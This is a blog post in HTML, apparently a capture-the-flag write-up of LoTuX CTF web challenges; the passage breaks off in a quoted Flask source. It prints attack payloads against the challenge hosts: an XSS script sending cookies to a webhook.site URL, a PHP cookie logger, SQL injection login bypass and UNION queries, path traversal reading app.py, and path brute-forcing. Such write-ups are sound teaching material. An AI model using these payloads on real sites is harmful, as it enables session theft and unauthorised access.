@@ -1,0 +1,402 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="Before allI start my challenges on LoTuX CTF from May, and I’ve solved most of the Web and Cryptography Challenges on this platform now, down below are my WPs :)LoTuXCTF.com   Write UpHTMLAn e4sy chal">
+<meta property="og:type" content="article">
+<meta property="og:title" content="LoTuX CTF WriteUp-Web">
+<meta property="og:url" content="http://wha13.github.io/2023/09/20/lotuxctf-web/index.html">
+<meta property="og:site_name" content="Whale120&#39;s Blog">
+<meta property="og:description" content="Before allI start my challenges on LoTuX CTF from May, and I’ve solved most of the Web and Cryptography Challenges on this platform now, down below are my WPs :)LoTuXCTF.com   Write UpHTMLAn e4sy chal">
+<meta property="og:locale" content="en_US">
+<meta property="article:published_time" content="2023-09-20T14:49:42.000Z">
+<meta property="article:modified_time" content="2024-07-25T09:30:32.267Z">
+<meta property="article:author" content="William Lin">
+<meta property="article:tag" content="CTF">
+<meta property="article:tag" content="Web Security">
+<meta property="article:tag" content="XSS">
+<meta property="article:tag" content="SQL Injection">
+<meta property="article:tag" content="LFI">
+<meta property="article:tag" content="loTuX CTF">
+<meta property="article:tag" content="RCE">
+<meta property="article:tag" content="backdoor">
+<meta name="twitter:card" content="summary">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    <title>LoTuX CTF WriteUp-Web</title>
+    <!-- async scripts -->
+    <!-- Google Analytics -->
+
+
+    <!-- Umami Analytics -->
+
+
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+		<script type="text/x-mathjax-config">
+		  MathJax.Hub.Config({
+			tex2jax: {
+			  skipTags: ['script', 'noscript', 'style', 'textarea', 'pre'],
+			  inlineMath: [['$','$']]
+			}
+		  });
+		</script>
+		<script src='https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.5/latest.js?config=TeX-MML-AM_CHTML' async></script>
+	
+<!-- hexo injector head_end start -->
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.12.0/dist/katex.min.css">
+
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/hexo-math@4.0.0/dist/style.css">
+<!-- hexo injector head_end end --><meta name="generator" content="Hexo 7.3.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a href="/search/">Search</a></li><!--
+     --><!--
+       --><li><a href="/tags/">tags</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" aria-label="Previous post" href="/2023/09/20/lotuxctf-crypto/"><i class="fa-solid fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" aria-label="Next post" href="/2023/08/31/first/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="Share post" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://wha13.github.io/2023/09/20/lotuxctf-web/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://wha13.github.io/2023/09/20/lotuxctf-web/&text=LoTuX CTF WriteUp-Web"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://wha13.github.io/2023/09/20/lotuxctf-web/&title=LoTuX CTF WriteUp-Web"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://wha13.github.io/2023/09/20/lotuxctf-web/&is_video=false&description=LoTuX CTF WriteUp-Web"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=LoTuX CTF WriteUp-Web&body=Check out this article: http://wha13.github.io/2023/09/20/lotuxctf-web/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://wha13.github.io/2023/09/20/lotuxctf-web/&title=LoTuX CTF WriteUp-Web"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://wha13.github.io/2023/09/20/lotuxctf-web/&title=LoTuX CTF WriteUp-Web"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://wha13.github.io/2023/09/20/lotuxctf-web/&title=LoTuX CTF WriteUp-Web"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://wha13.github.io/2023/09/20/lotuxctf-web/&title=LoTuX CTF WriteUp-Web"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://wha13.github.io/2023/09/20/lotuxctf-web/&name=LoTuX CTF WriteUp-Web&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://wha13.github.io/2023/09/20/lotuxctf-web/&t=LoTuX CTF WriteUp-Web"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    
+    
+      <div id="toc">
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Before-all"><span class="toc-number">1.</span> <span class="toc-text">Before all</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Write-Up"><span class="toc-number">2.</span> <span class="toc-text">Write Up</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#HTML"><span class="toc-number">2.1.</span> <span class="toc-text">HTML</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Usefull-tools"><span class="toc-number">2.2.</span> <span class="toc-text">Usefull tools</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Trending-Cats"><span class="toc-number">2.3.</span> <span class="toc-text">Trending Cats</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#forum"><span class="toc-number">2.4.</span> <span class="toc-text">forum</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Cookie-Stealer"><span class="toc-number">2.5.</span> <span class="toc-text">Cookie Stealer</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#LoTuX-CTF-Min-0"><span class="toc-number">2.6.</span> <span class="toc-text">LoTuX CTF Min 0</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#LoTuX-CTF-Min-1"><span class="toc-number">2.7.</span> <span class="toc-text">LoTuX CTF Min 1</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Blank-Site-1"><span class="toc-number">2.8.</span> <span class="toc-text">Blank Site 1</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Image-Uploader-1"><span class="toc-number">2.9.</span> <span class="toc-text">Image Uploader 1</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#How2Login"><span class="toc-number">2.10.</span> <span class="toc-text">How2Login</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#THE-EYE-2"><span class="toc-number">2.11.</span> <span class="toc-text">THE EYE 2</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Blank-Site-2"><span class="toc-number">2.12.</span> <span class="toc-text">Blank Site 2</span></a></li></ol></li></ol>
+      </div>
+    
+  </span>
+</div>
+
+    
+    <div class="content index py4 ">
+        
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle p-name" itemprop="name headline">
+        LoTuX CTF WriteUp-Web
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span class="p-name" itemprop="name">William Lin</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2023-09-20T14:49:42.000Z" class="dt-published" itemprop="datePublished">2023-09-20</time>
+        
+      
+    </div>
+
+
+      
+
+      
+    <div class="article-tag">
+        <i class="fa-solid fa-tag"></i>
+        <a class="p-category" href="/tags/CTF/" rel="tag">CTF</a>, <a class="p-category" href="/tags/LFI/" rel="tag">LFI</a>, <a class="p-category" href="/tags/RCE/" rel="tag">RCE</a>, <a class="p-category" href="/tags/SQL-Injection/" rel="tag">SQL Injection</a>, <a class="p-category" href="/tags/Web-Security/" rel="tag">Web Security</a>, <a class="p-category" href="/tags/XSS/" rel="tag">XSS</a>, <a class="p-category" href="/tags/backdoor/" rel="tag">backdoor</a>, <a class="p-category" href="/tags/loTuX-CTF/" rel="tag">loTuX CTF</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content e-content" itemprop="articleBody">
+    <h1 id="Before-all"><a href="#Before-all" class="headerlink" title="Before all"></a>Before all</h1><p>I start my challenges on LoTuX CTF from May, and I’ve solved most of the Web and Cryptography Challenges on this platform now, down below are my WPs :)<br><a target="_blank" rel="noopener" href="http://lotuxctf.com:20003/4310.jpg">LoTuXCTF.com</a>  </p>
+<h1 id="Write-Up"><a href="#Write-Up" class="headerlink" title="Write Up"></a>Write Up</h1><h2 id="HTML"><a href="#HTML" class="headerlink" title="HTML"></a>HTML</h2><p>An e4sy challenge, start with a veiw source~  </p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>Welcome!<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">header</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">h1</span>&gt;</span>Welcome!<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">header</span>&gt;</span></span><br><span class="line">    This is my very first page,and there are nothing. </span><br><span class="line">    <span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">button</span> <span class="attr">onclick</span>=<span class="string">&quot;cat()&quot;</span> <span class="attr">hidden</span>&gt;</span> Check out my second page <span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">function</span> <span class="title function_">cat</span>(<span class="params"></span>)&#123;</span></span><br><span class="line"><span class="language-javascript">            <span class="variable language_">window</span>.<span class="property">location</span>.<span class="property">href</span> = <span class="string">&quot;cat.html&quot;</span>;</span></span><br><span class="line"><span class="language-javascript">        &#125;</span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">function</span> <span class="title function_">magic</span>(<span class="params"></span>)&#123;</span></span><br><span class="line"><span class="language-javascript">          <span class="variable language_">window</span>.<span class="property">location</span>.<span class="property">href</span> = <span class="string">&quot;secret.html&quot;</span>;</span></span><br><span class="line"><span class="language-javascript">        &#125;</span></span><br><span class="line"><span class="language-javascript">    </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>there were two hidden bottons doing functions <code>cat()</code> and <code>magic()</code>, so I typed it on console.<br>After that, I entered a page with a title <strong>This is a cute cat</strong> and a page called secret, and collected two partial flags <code>LoTuX&#123;fR0nT_</code> and <code>3nD_h1Dden_</code>.<br>Finally, inspect the page secret again and there was also a hidden page which its path was <code>flag.html</code>.<br>Opened flag.html, and got the last part of flag <code>Mes54ge&#125;</code>.  </p>
+<h2 id="Usefull-tools"><a href="#Usefull-tools" class="headerlink" title="Usefull tools"></a>Usefull tools</h2><p>Also a starter one<br>First I just opened the webpage and found out a hint called <code>burp5u17e_ch4ll3nge</code><br>So I opened Burp Suite and caught a packet,and the header had an option called challenge with a value 0, so I just changed it into 1 and got a partial flag LoTuX{bd244966385a624 and a hint told me to use curl.<br>Next, sent a curl payload:  </p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl  http://lotuxctf.com:20001/cur1_ch4ll3nge</span><br></pre></td></tr></table></figure>
+<p>And received these informations:  </p>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;error&quot;</span><span class="punctuation">:</span><span class="string">&quot;Error&quot;</span><span class="punctuation">,</span><span class="attr">&quot;hint&quot;</span><span class="punctuation">:</span><span class="string">&quot;How to view headers?&quot;</span><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>
+<p>So I changed the payload into this:  </p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -i  http://lotuxctf.com:20001/cur1_ch4ll3nge</span><br></pre></td></tr></table></figure>
+<p>And some informations appeared:  </p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">HTTP/1.1 200 OK</span><br><span class="line">Server: gunicorn</span><br><span class="line">Date: Tue, 19 Sep 2023 23:47:56 GMT</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: application/json</span><br><span class="line">Content-Length: 48</span><br><span class="line">Hint: In an HTTP request, there is an important element called the request method. If the server allows any requests methods other than GET, how can we know which other methods are allowed by the server?</span><br><span class="line"></span><br><span class="line">&#123;&quot;error&quot;:&quot;Error&quot;,&quot;hint&quot;:&quot;How to view headers?&quot;&#125;</span><br></pre></td></tr></table></figure>
+<p>So I used a <code>OPTIONS</code> to get its http method options, but nothing appeared, so I added an -i to my payload and saw the headers:  </p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">HTTP/1.1 200 OK</span><br><span class="line">Server: gunicorn</span><br><span class="line">Date: Tue, 19 Sep 2023 23:51:36 GMT</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: text/html; charset=utf-8</span><br><span class="line">Allow: HEAD, GET, H1DD3N_HT7P_ME7H0D, OPTIONS</span><br><span class="line">Content-Length: 0</span><br></pre></td></tr></table></figure>
+<p>well… there was an option called <code>H1DD3N_HT7P_ME7H0D</code>, just sent a payload with it and I got the second part of flag:  </p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -i -X H1DD3N_HT7P_ME7H0D  http://lotuxctf.com:20001/cur1_ch4ll3nge</span><br></pre></td></tr></table></figure>
+<p>received datas:  </p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">HTTP/1.1 200 OK</span><br><span class="line">Server: gunicorn</span><br><span class="line">Date: Tue, 19 Sep 2023 23:52:55 GMT</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: application/json</span><br><span class="line">Content-Length: 31</span><br><span class="line">Flag2: 6c007b36cb1719bcc21c2ac</span><br><span class="line"></span><br><span class="line">&#123;&quot;next&quot;:&quot;/r3que57s_ch4ll3nge&quot;&#125;</span><br></pre></td></tr></table></figure>
+<p>partial flag and a hint told me to try python request, this was my payload:  </p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">import requests as req</span><br><span class="line"></span><br><span class="line">s = req.Session()</span><br><span class="line"></span><br><span class="line">s.get(&#x27;http://lotuxctf.com:20001/r3que57s_ch4ll3nge&#x27;)</span><br><span class="line">print(s.post(&#x27;http://lotuxctf.com:20001/r3que57s_ch4ll3nge&#x27;).text)</span><br></pre></td></tr></table></figure>
+<p>And <strong>FINALLY</strong> ended, quite a little bit tired bruh  </p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;flag3&quot;:&quot;9997b6814310506060199a6aa4&#125;&quot;,&quot;next&quot;:&quot;https://www.youtube.com/watch?v=dQw4w9WgXcQ&quot;&#125;</span><br></pre></td></tr></table></figure>
+<h2 id="Trending-Cats"><a href="#Trending-Cats" class="headerlink" title="Trending Cats"></a>Trending Cats</h2><p>A site contained some meme cats, the links of the pictures were interseting:  </p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://lotuxctf.com:20003/4310.jpg</span><br></pre></td></tr></table></figure>
+<p>So I used gobuster to crack the paths from 0000 to 9999 :  </p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gobuster <span class="built_in">dir</span> --url http://lotuxctf.com:20003/ -w 0000_to_9999</span><br></pre></td></tr></table></figure>
+<p>There was a hidden image:  </p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://lotuxctf.com:20003/6166.jpg</span><br></pre></td></tr></table></figure>
+<p>With the word written on it(spin cat), just opened the path: <code>http://lotuxctf.com:20003/spin.php</code>, there’s a base 64 value aGFwcHk&#x3D; on the button, changed it into the base64 of “spin”<br>And there’s cute flag~~~<br><code>LoTuX&#123;Th3reR2kinds0fc4tv1dEos&#125;</code></p>
+<h2 id="forum"><a href="#forum" class="headerlink" title="forum"></a>forum</h2><p>First of all, I logged in as user with the account&#x2F;password provided<br>Ok, there were some posts but only admin can edit it…<br>So I back to the login page and bypass the password with a simple SQL Injection payloads:  </p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">account:admin&#x27;#</span><br><span class="line">password:a</span><br></pre></td></tr></table></figure>
+<p>Aha, logged in successful and got the second(?!) part of flag at the first post…  </p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Flag 2/2 : _vu1ner4biliTy&#125;</span><br></pre></td></tr></table></figure>
+<p>So.. where’s my first flag XD<br>I was just stucked by here after ten minutes, I found out the first flag is at post0.php…  </p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Flag 1/2:LoTuX&#123;S0_Much</span><br></pre></td></tr></table></figure>
+<p>What an IDOR 🙃</p>
+<h2 id="Cookie-Stealer"><a href="#Cookie-Stealer" class="headerlink" title="Cookie Stealer"></a>Cookie Stealer</h2><p>An message board Web app which you can let the admin visit your post at your homepage.<br>I just used a xss payload down below and steal cookies with <a target="_blank" rel="noopener" href="https://webhook.site/">webhook.site</a>.  </p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="title function_">fetch</span>(<span class="string">&#x27;https://webhook.site/a834359c-ba8f-4762-890c-fbfc9f48688a?cookie=&#x27;</span>+<span class="variable language_">document</span>.<span class="property">cookie</span>);</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p>and clicked “share to admin”, back to the webhook site and got the flag~~<br>BTW, there’s also a XSS payload written in php if the site has some other protections:  </p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$_COOKIE</span> <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$value</span>)&#123;</span><br><span class="line"><span class="title function_ invoke__">system</span>(<span class="string">&quot;echo <span class="subst">$key</span> &gt;&gt; logger.txt&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">system</span>(<span class="string">&quot;echo <span class="subst">$value</span>&gt;&gt; logger.txt&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>and check the path <code>logger.txt</code>  </p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">session</span><br><span class="line">4bc94b4a-235e-43f8-88db-836a21466279.PYAiiRxKXmymNY5ivwjz_NMsxqE</span><br><span class="line">PHPSESSID</span><br><span class="line">234a3e6a721faf88e21700d4b9043765</span><br><span class="line">TOP_SECRET</span><br><span class="line">LoTuX&#123;XSS_ch4ll3nGe_For_8abYs&#125;</span><br></pre></td></tr></table></figure>
+<p>Over!!!  </p>
+<h2 id="LoTuX-CTF-Min-0"><a href="#LoTuX-CTF-Min-0" class="headerlink" title="LoTuX CTF Min 0"></a>LoTuX CTF Min 0</h2><p>First, I used githacking to get the git file:  </p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">githacker --url http://lotuxctf.com:20006/.git/ --output-folder .</span><br></pre></td></tr></table></figure>
+<p>Then I moved to the file and checked out the logs:  </p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git <span class="built_in">log</span></span><br></pre></td></tr></table></figure>
+<p>Response:  </p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">commit 2e2da5c31bcce34a4b5019cf8ab45987a8dcca22 (HEAD -&gt; master, origin/master, origin/HEAD)</span><br><span class="line">Author: Curious-Lucifer &lt;curious.lucifer.domini@gmail.com&gt;</span><br><span class="line">Date:   Sat Aug 12 20:25:01 2023 +0800</span><br><span class="line"></span><br><span class="line">    Finish</span><br><span class="line"></span><br><span class="line">commit e9dea4d8d3c8b8b24bcb031649fc0421d330b762</span><br><span class="line">Author: Curious-Lucifer &lt;curious.lucifer.domini@gmail.com&gt;</span><br><span class="line">Date:   Sat Aug 12 20:24:24 2023 +0800</span><br><span class="line"></span><br><span class="line">    commit</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>Reset to the previous one:  </p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git reset --hard HEAD^</span><br></pre></td></tr></table></figure>
+<p>there was a file: init.sql, I found the flag and also a sql injection for LoTuX CTF Min 1<br>flag:<br><code>LoTuX&#123;Why_1s_thi$_per50n_sO_c4r3le5s?&#125;</code></p>
+<h2 id="LoTuX-CTF-Min-1"><a href="#LoTuX-CTF-Min-1" class="headerlink" title="LoTuX CTF Min 1"></a>LoTuX CTF Min 1</h2><p>By sql injection found at challenge 0, I used a UNION BASE SQL Injection Payload as a user name to register  </p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27; UNION SELECT concat(id), concat(tag), concat(content), NULL FROM secret #</span></span><br></pre></td></tr></table></figure>
+<p>And I got the flag.<br><code>LoTuX&#123;Wh4t_@_maRv3l0u5_de$1gn_7h1s_1s?!?&#125;</code></p>
+<h2 id="Blank-Site-1"><a href="#Blank-Site-1" class="headerlink" title="Blank Site 1"></a>Blank Site 1</h2><p>A BLANK site with only a picture, check out the url of it:  </p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://lotuxctf.com:20007/uploads?file=BlankSite.png</span><br></pre></td></tr></table></figure>
+<p>Maybe a LFI?  </p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://lotuxctf.com:20007/uploads?file=../app.py</span><br></pre></td></tr></table></figure>
+<p>Aha! down below are the contents of it:  </p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">from flask import *</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line">@app.get(&#x27;/&#x27;)</span><br><span class="line">def index():</span><br><span class="line">    return render_template(&#x27;index.html&#x27;)</span><br><span class="line"></span><br><span class="line">@app.get(&#x27;/uploads&#x27;)</span><br><span class="line">def uploads():</span><br><span class="line">    file = request.args.get(&quot;file&quot;)</span><br><span class="line">    if &quot;FLAG2&quot; in file:</span><br><span class="line">        return &quot;(≖＿≖)✧&quot;</span><br><span class="line"></span><br><span class="line">    return send_file(&quot;uploads/&quot; + file)</span><br><span class="line"></span><br><span class="line">@app.get(&#x27;/1d538e83d6f6b08f&#x27;)</span><br><span class="line">def secret():</span><br><span class="line">    try:</span><br><span class="line">        with 